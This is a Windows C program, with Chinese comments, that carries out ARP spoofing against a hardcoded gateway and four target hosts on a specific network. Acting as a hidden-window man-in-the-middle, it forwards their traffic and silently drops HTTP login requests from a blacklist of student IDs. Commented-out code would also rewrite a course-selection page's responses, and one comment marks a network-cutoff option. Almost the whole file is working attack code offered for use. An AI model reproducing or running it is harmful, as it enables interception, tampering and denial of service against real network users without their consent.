#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <pcap.h>
#include <time.h>
#include <conio.h>
#include <winsock2.h>
#include <iphlpapi.h>

#pragma comment(linker,"/subsystem:windows /entry:mainCRTStartup")

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"pcap.lib")

const char *gateway_IP="210.44.159.126";
const char gateway_MAC[]=
{
    0x00,0x0f,0xe2,0x45,0xc0,0x9a
};    //网关地址

const char *Target_IP[]= {"210.44.159.4","210.44.159.20","210.44.159.22","210.44.159.33"};
const char Target_MAC[]=
{
    0xe4,0x1f,0x13,0xb6,0x32,0xfc,\
    0xd4,0x3d,0x7e,0x72,0x69,0x50,\
    0xd4,0x3d,0x7e,0x72,0x65,0xd4,\
    0xe4,0x1f,0x13,0xb5,0xe4,0xf0
};
const int Target_Count=4;
const int ListenPort=80;
char *Blacklist[]=
{
    "201203011129","201203011130","201203011131","201203011132","201203011133",\
    "201203011134","201203011135","201203011136",NULL
};

typedef struct
{
    int count;
    unsigned long int last_time;
} CourseInfo;

CourseInfo CourseArray[3];

typedef struct
{
    char myIP[16];
    char myMAC[6];
    pcap_t *hpcap;
} ThreadInfo;

typedef struct DLC_Header
{
    unsigned char DesMAC[6];     //以太网目的地址
    unsigned char SrcMAC[6];     //以太网源地址
    unsigned short EtherType;    //上层协议类型
} DLCHEADER;

typedef struct ipheader
{
    unsigned char ip_hl:4;         /*header length(报头长度）*/
    unsigned char ip_v:4;          /*version(版本)*/
    unsigned char ip_tos;          /*type os service服务类型*/
    unsigned short int ip_len;     /*total length (总长度)*/
    unsigned short int ip_id;      /*identification (标识符)*/
    unsigned short int ip_off;     /*fragment offset field(段移位域)*/
    unsigned char ip_ttl;          /*time to live (生存时间)*/
    unsigned char ip_p;            /*protocol(上层协议类型)*/
    unsigned short int ip_sum;     /*checksum(校验和)*/
    unsigned char ip_src[4];       /*source address(源地址)*/
    unsigned char ip_dst[4];       /*destination address(目的地址)*/
} IP;

typedef struct tcpheader
{
    unsigned short int sport;    /*source port (源端口号)*/
    unsigned short int dport;    /*destination port(目的端口号)*/
    unsigned int th_seq;         /*sequence number(包的序列号)*/
    unsigned int th_ack;         /*acknowledgement number(确认应答号)*/
    unsigned char th_x:4;        /*unused(未使用)*/
    unsigned char th_off:4;      /*data offset(数据偏移量)*/
    unsigned char Flags;         /*标志全*/
    unsigned short int th_win;   /*windows(窗口)*/
    unsigned short int th_sum;   /*checksum(校验和)*/
    unsigned short int th_urp;   /*urgent pointer(紧急指针)*/
} TCP;

typedef struct ARP_Frame
{
    unsigned short HW_Type;       //硬件类型
    unsigned short Prot_Type;     //上层协议类型
    unsigned char HW_Addr_Len;    //MAC地址长度
    unsigned char Prot_Addr_Len;  //IP地址长度
    unsigned short Opcode;        //操作码,01表示请求，02表示应答

    unsigned char Send_HW_Addr[6];     //发送端MAC地址
    unsigned char Send_Prot_Addr[4];   //发送端IP地址
    unsigned char Targ_HW_Addr[6];     //目标MAC地址
    unsigned char Targ_Prot_Addr[4];   //目标IP地址
} ARPFRAME;

BOOL GetAdapterMAC(char *ipbuff,char *macbuff)
{
    IP_ADAPTER_INFO AdapterInfo[16];  //定义存储网卡信息的结构数组
    DWORD ArrayLength=sizeof(AdapterInfo);  //缓冲区长度
    if(GetAdaptersInfo(AdapterInfo,&ArrayLength)!=ERROR_SUCCESS)
        return ERROR;
    PIP_ADAPTER_INFO PAdapterInfo=AdapterInfo;

    do
    {
        if(!strcmp(ipbuff,PAdapterInfo->IpAddressList.IpAddress.String)) break;
        PAdapterInfo=PAdapterInfo->Next;
    }
    while(PAdapterInfo);

    memset(macbuff,NULL,6);
    memcpy(macbuff,PAdapterInfo->Address,6);         //获取网卡MAC地址

    return TRUE;
}

char *iptos(u_long in)
{
    static char output[12][3*4+3+1];
    static short which;
    u_char *p;

    p = (u_char *)&in;
    which = (which + 1 == 12 ? 0 : which + 1);
    sprintf(output[which], "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
    return output[which];
}

BOOL ChooseDev(char *devbuff,int buffsize,char *ipbuff)
{
    pcap_if_t *alldevs=NULL,*p=NULL;
    char errbuff[PCAP_ERRBUF_SIZE];
    int i,choose;
    pcap_addr_t *a=NULL;

    memset(devbuff,NULL,buffsize);
    if(pcap_findalldevs(&alldevs,errbuff)==-1)
        return ERROR;

    for(p=alldevs,i=0; p; p=p->next)
    {
        printf("%d.%s(%s)\n",++i,p->name,p->description);
        if((a=p->addresses))
        {
            switch(a->addr->sa_family)
            {
            case AF_INET:
                printf("Address Family Name: AF_INET\n");
                if (a->addr)
                    /* Y- IP 地址 */
                    printf("Address: %s\n",iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
                if (a->netmask)
                    /* Y- 掩码 */
                    printf("Netmask: %s\n",iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
                break;
            default:
                /* 未知 */
                printf("Address Family Name: Unknown\n");
                break;
            }
        }
        printf("------------------------------------------------------\n");
    }

    do
    {
        printf("请选择一个网卡:");
        fflush(stdin);
    }
    while(scanf("%d",&choose)!=1 || choose<1 ||choose>i);

    for(p=alldevs,i=1; i!=choose; p=p->next,i++);
    strcat(devbuff,p->name);
    memset(ipbuff,NULL,15);
    a=p->addresses;
    strcat(ipbuff,iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
    pcap_freealldevs(alldevs);

    return TRUE;
}

DWORD WINAPI SendPacket(pcap_t *hpcap,char *Packet,unsigned int packetsize)
{
    if(pcap_sendpacket(hpcap,Packet,packetsize)!=0)
    {
        printf("数据包发送失败。\n");
        return -1;
    }

    return 0;
}

void _memcpy(char *tar,char *src,unsigned int len)
{
    char *tmp=NULL;

    tmp=(char *)malloc(len+1);
    if(tmp==NULL) return;
    memset(tmp,NULL,len+1);
    memcpy(tmp,src,len);
    memcpy(tar,tmp,len);
    free(tmp);

    return;
}

typedef struct pseudoTcpHeader
{
    unsigned long int ip_src;
    unsigned long int ip_dst;
    unsigned char zero;           //always zero
    unsigned char protocol;       // =0x06
    unsigned short tcp_len;       //TCP头+数据   （不加伪头长度）
} TCP_Psd_Header;


unsigned short int checksum(unsigned short int *buffer,int size)
{
    unsigned long cksum=0;
    while(size>1)
    {
        cksum+=*buffer++;
        size-=sizeof(unsigned short int);
    }
    if(size)
    {
        cksum+=*(UCHAR *)buffer;
    }
    //将32位数转换成16
    while (cksum>>16)
        cksum=(cksum>>16)+(cksum & 0xffff);
    return (unsigned short int)(~cksum);
}

void PacketCheckSum(unsigned char Packet[])
{
    TCP_Psd_Header *TPH=NULL;
    char *buffer=NULL;
    unsigned int size=0;

    DLCHEADER *DLCHeader=NULL;
    IP *IPHeader=NULL;
    TCP *TCPHeader=NULL;

    DLCHeader=(DLCHEADER *)Packet;
    IPHeader=(IP *)(Packet+sizeof(DLCHEADER));
    TCPHeader=(TCP *)(Packet+sizeof(DLCHEADER)+sizeof(IP));

    TCPHeader->th_sum=0;
    size=ntohs(IPHeader->ip_len);
    buffer=(char *)malloc(size+sizeof(TCP_Psd_Header));
    if(buffer==NULL) return;
    memset(buffer,NULL,size+sizeof(TCP_Psd_Header));
    TPH=(TCP_Psd_Header *)buffer;
    TPH->ip_dst=*(unsigned long int *)IPHeader->ip_dst;
    TPH->ip_src=*(unsigned long int *)IPHeader->ip_src;
    TPH->protocol=0x06;
    TPH->tcp_len=htons(size-sizeof(IP));

    memcpy(buffer+sizeof(TCP_Psd_Header),TCPHeader,size-sizeof(IP));

    TCPHeader->th_sum=checksum(buffer,size-sizeof(IP)+sizeof(TCP_Psd_Header));

    free(buffer);

    return;
}

int Sniffer_Gateway_to_Server(char *Packet,int packetsize)
{
    IP *IPHeader=(IP *)(Packet+sizeof(DLCHEADER));
    TCP *TCPHeader=(TCP *)(Packet+sizeof(DLCHEADER)+sizeof(IP));
    char *data=(char *)(Packet+sizeof(DLCHEADER)+sizeof(IP)+sizeof(TCP));
    char *pStart=NULL,*pEnd=NULL;
    char p_str[100];
    int i;

    for(i=0; Blacklist[i]!=NULL; i++)
    {
        memset(p_str,NULL,sizeof(p_str));
        sprintf(p_str,"txtUserName=%s",Blacklist[i]);
        pStart=strstr(data,p_str);
        if(pStart!=NULL)
        {
            printf("已拦截\n");
            return 0;
        }
    }

    return 1;
}

/*
int Sniffer_Server_to_Gateway(char *Packet,int packetsize)
{
    IP *IPHeader=(IP *)(Packet+sizeof(DLCHEADER));
    TCP *TCPHeader=(TCP *)(Packet+sizeof(DLCHEADER)+sizeof(IP));
    char *data=(char *)(Packet+sizeof(DLCHEADER)+sizeof(IP)+sizeof(TCP));

    char *pStart=NULL,*pEnd=NULL;
    int number,dev,ret=-1;
    char para[100];
    printf("收到数据\n");
    pStart=data;
    while(1)
        if((pStart=strstr(pStart,"DataGrid1:_ctl2:zp")))
        {
            if((pEnd=strstr(pStart,"'201203011121','(2013-2014-2)-0311301-03032-1','03032'")))
            {
                //定位成功
                if((pStart=strstr(pStart,"value=\"")))
                {
                    pStart+=strlen("value=\"");
                    if((pEnd=strstr(pStart,"\"")))
                    {
                        dev=pEnd-pStart;
                        if(dev!=0)
                        {
                            memset(para,NULL,sizeof(para));
                            sprintf(para,"%d",course_1);
                            memcpy(pStart,para,2);
                            PacketCheckSum(Packet,dev);   //重新计算校验和
                        }
                    }
                }
                break;
            }
            else
            {
                pStart+=10;
                continue;
            }
        }
        else
            break;

    return ret;
}
*/
int n=0;

void filter(u_char *Parameter,struct pcap_pkthdr *pkthdr,u_char *Packet)
{
    int i,ret=-1;
    char *Packet_2=NULL;
    ThreadInfo TI=*(ThreadInfo *)Parameter;

    DLCHEADER *DLCHeader=NULL;
    IP *IPHeader=NULL;
    TCP *TCPHeader=NULL;

    unsigned int PacketSize=pkthdr->caplen;
    unsigned long tar_ip,gaw_ip;

    if(PacketSize<sizeof(DLCHEADER)+sizeof(IP)+sizeof(TCP))
    {
        //printf("收到错误数据包!\n");
        return;
    }

    DLCHeader=(DLCHEADER *)Packet;
    IPHeader=(IP *)(Packet+sizeof(DLCHEADER));
    TCPHeader=(TCP *)(Packet+sizeof(DLCHEADER)+sizeof(IP));
    char *data=(char *)(Packet+sizeof(IP)+sizeof(TCP));

    for(i=0; i<Target_Count; i++)
    {
        tar_ip=inet_addr(Target_IP[i]);
        //gaw_ip=inet_addr(gateway_IP);

        if(!memcmp(IPHeader->ip_dst,(char *)&tar_ip,4) && !memcmp(TI.myMAC,DLCHeader->DesMAC,6)\
                && !memcmp(gateway_MAC,DLCHeader->SrcMAC,6))
        {
            //表明数据包是从网关欺骗过来的
            //printf("欺骗流量:%d\r",++n);
            memcpy(DLCHeader->DesMAC,&Target_MAC[6*i],6);           //更改数据包的发送地址
            memcpy(DLCHeader->SrcMAC,TI.myMAC,6);                   //来源地址更改为中间人MAC

            //检测帧中数据协议类型
            if(ntohs(DLCHeader->EtherType)==0x0800 && IPHeader->ip_p==0x06)
            {
                //捕获到TCP数据包
                if(ntohs(TCPHeader->dport)==ListenPort)
                {
                    //目标端口为监听端口
                    //printf("截获到目标数据。\n");
                    Packet_2=(char *)malloc(PacketSize+1);
                    if(Packet_2==NULL) return;
                    memset(Packet_2,NULL,PacketSize+1);
                    memcpy(Packet_2,Packet,PacketSize);

                    if(Sniffer_Gateway_to_Server(Packet_2,PacketSize))
                        SendPacket(TI.hpcap,Packet_2,PacketSize);
                    free(Packet_2);
                    break;
                }
            }

            SendPacket(TI.hpcap,Packet,PacketSize);    //转发数据包
            break;
        }
        /*
        else if(!memcmp(IPHeader->ip_src,(char *)&tar_ip,4) && !memcmp(TI.myMAC,DLCHeader->DesMAC,6)\
                && !memcmp(IPHeader->ip_dst,(char *)&gaw_ip,4))
        {
            //数据包是从主机欺骗过来的

            memcpy(DLCHeader->DesMAC,gateway_MAC,6);           //更改数据包的发送地址
            memcpy(DLCHeader->SrcMAC,TI.myMAC,6);              //来源地址更改为中间人MAC

            //检测帧中数据协议类型
            if(ntohs(DLCHeader->EtherType)==0x0800 && IPHeader->ip_p==0x06)
            {
                //捕获到TCP数据包
                if(ntohs(TCPHeader->sport)==80)
                {
                    //来源端口为80
                    ret=Sniffer_Server_to_Gateway(Packet,PacketSize);
                    if(ret==1)
                        PacketSize++;
                }
            }

            SendPacket(TI.hpcap,Packet,PacketSize);    //转发数据包
        }
        */
    }

    return 0;
}

int Ether_Sniffer(ThreadInfo *Parameter)
{
    ThreadInfo *TI=Parameter;

    pcap_loop(TI->hpcap,0,filter,(u_char *)TI);

    return 0;
}


pcap_t *OpenAdapter(char *devName)
{
    pcap_t *hpcap=NULL;
    char errbuf[PCAP_ERRBUF_SIZE];

    if((hpcap=pcap_open_live(devName,        // 设备名
                             65536,          // 指定要捕捉的数据包的部分,65536 保证所有在链路层上的包都能够被抓到
                             1,    		     // 混杂模式
                             1,         	 // 读数据的超时时间
                             errbuf          // 错误缓冲区
                            ))==NULL)
    {
        printf("打开网卡出错。\n");
        return NULL;
    }
    return hpcap;
}

DWORD WINAPI Close_Control(LPVOID Parameter)
{
    Sleep(1000*60*5);           //程序运行时长
    exit(0);
    return 0;
}

DWORD WINAPI CountControl(LPVOID Parameter)
{
    int i;
    unsigned long int now_time=0;

    while(1)
    {
        for(i=0; i<3; i++)
        {
            now_time=time(NULL);
            if(now_time-CourseArray[i].last_time>10*60)
            {
                //十分钟后计数器归零
                CourseArray[i].count=0;
                CourseArray[i].last_time=now_time;
            }
        }
        Sleep(30000);
    }
    return 0;
}

void Fill_ARPPACKET(char *ARPPacket,int packetsize,char *desmac,char *desIP,char *srcmac,char *srcip,int op)
{
    /*
        *ARPPacket    指向将要填充的数据包指针
         packetsize   数据包大小
        *desmac 指向存有目标MAC的缓冲区地址
        *desIP  指向存有目标IP的缓冲区地址
        *srcmac 指向存有来源MAC的缓冲区地址
        *srcip  指向存有来源IP的缓冲区地址
         op     ARP包类型
        */
    DLCHEADER *DLCHeader=(DLCHEADER *)ARPPacket;
    ARPFRAME *ARPFrame=(ARPFRAME *)(ARPPacket+sizeof(DLCHEADER));
    memset(ARPPacket,NULL,packetsize);  //清空包内容
    //填充以太网目的地址
    if(op==1)    //表示ARP请求包.
    {
        memset(DLCHeader->DesMAC,0xff,6);    //用ffffffffffff填充以太网头目的MAC地址。
        memset(ARPFrame->Targ_Prot_Addr,NULL,4);
        memset(ARPFrame->Targ_HW_Addr,NULL,6);
    }
    else
    {
        memcpy(DLCHeader->DesMAC,desmac,6);
        memcpy(ARPFrame->Targ_Prot_Addr,desIP,4);
        memcpy(ARPFrame->Targ_HW_Addr,DLCHeader->DesMAC,6);
    }

    //填充以太网源地址
    memcpy(DLCHeader->SrcMAC,srcmac,6);
    memcpy(ARPFrame->Send_HW_Addr,srcmac,6);
    //填充ARP包源IP
    memcpy(ARPFrame->Send_Prot_Addr,srcip,4);
    DLCHeader->EtherType=htons((unsigned short)0x0806);    //0x0806表示ARP协议，0x0800表示IP协议
    ARPFrame->HW_Addr_Len=(unsigned char)6;
    ARPFrame->Prot_Addr_Len=(unsigned char)4;
    ARPFrame->HW_Type=htons((unsigned short)1);
    ARPFrame->Opcode=htons((unsigned short)op);   //01表示请求，02表示应答
    ARPFrame->Prot_Type=htons((unsigned short)0x0800);
}

DWORD WINAPI ARPAttack(LPVOID Parameter)
{
    //A>>>>>单向欺骗>>>>>>B
    int i;
    char ARPPacket[42],myMAC[6];
    ThreadInfo *TI=(ThreadInfo *)Parameter;
    unsigned long int A_addr,B_addr;

    memcpy(myMAC,TI->myMAC,6);

    while(1)
    {
        for(i=0; i<Target_Count; i++)
        {
            memset(ARPPacket,NULL,sizeof(ARPPacket));
            A_addr=inet_addr(gateway_IP);
            B_addr=inet_addr(Target_IP[i]);
            //以ARP应答的方式欺骗主机A
            Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),gateway_MAC,(char *)&A_addr,myMAC,(char *)&B_addr,2);
            SendPacket(TI->hpcap,ARPPacket,sizeof(ARPPacket));
        }
        Sleep(1000);      //欺骗周期为3秒
    }

    return 0;
}

int main(int argc,char *argv[])
{
    //CloseHandle(CreateThread(NULL,0,Close_Control,NULL,0,NULL));
    char devName[100];
    char myIPAddress[15],myMAC[6];
    pcap_t *hpcap=NULL;
    HANDLE hSnifferThread;
    ThreadInfo TI;

    memset(&TI,NULL,sizeof(TI));
    memset(CourseArray,NULL,sizeof(CourseInfo)*3);

    if(ChooseDev(devName,sizeof(devName),myIPAddress)!=TRUE)
    {
        printf("获取网卡失败。\n");
        getch();
        return -1;
    }
    //获取本机网卡MAC
    if(GetAdapterMAC(myIPAddress,myMAC)!=TRUE)
    {
        printf("获取网卡MAC失败。\n");
        getch();
        return -1;
    }
    //打开网卡
    if((hpcap=OpenAdapter(devName))==NULL)
    {
        printf("网卡打开出错。\n");
        getch();
        return -1;
    }
    system("cls");
    printf("running...\n");

    memcpy(TI.myMAC,myMAC,6);
    //memset(TI.myMAC,0x01,6);     //断网攻击
    memcpy(TI.myIP,myIPAddress,15);
    TI.hpcap=hpcap;

    CloseHandle(CreateThread(NULL,0,ARPAttack,(LPVOID)&TI,0,NULL));
    //CloseHandle(CreateThread(NULL,0,CountControl,NULL,0,NULL));

    Ether_Sniffer(&TI);
    while(1) Sleep(11);

    return 0;
}










